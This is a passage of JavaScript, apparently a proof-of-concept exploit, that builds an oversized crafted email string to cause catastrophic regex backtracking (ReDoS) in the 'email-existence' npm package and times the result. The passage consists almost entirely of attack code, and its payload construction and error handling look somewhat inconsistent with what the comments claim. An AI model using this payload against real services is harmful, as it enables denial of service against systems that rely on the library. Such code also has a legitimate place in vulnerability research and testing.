   // by exploiting overlapping quantifiers around the '@' anchor and exceeding 
   // the safe threshold introduced in the vulnerability fix.
   const maliciousEmail = "(?:ab|a)".repeat(3000) + "@" + "c".repeat(3000) + "\n";

   console.log(`[PoC] Triggering ReDoS with email length: ${maliciousEmail.length} characters`);
   const start = Date.now();

   const emailExistence = require('email-existence');

   // Invoke validation. The regex engine will traverse exponential backtracking 
   // states due to the greedy \S+ quantifiers and ambiguous branching around '@'.
   // Per requirements, exceptions are intentionally left unhandled to propagate visibly.
   await new Promise((resolve, reject) => {
     emailExistence(maliciousEmail, (err, exists) => {
       if (err) throw err;
       console.log(`[PoC] Validation completed in ${Date.now() - start}ms`);
       resolve(exists);
     });
   });
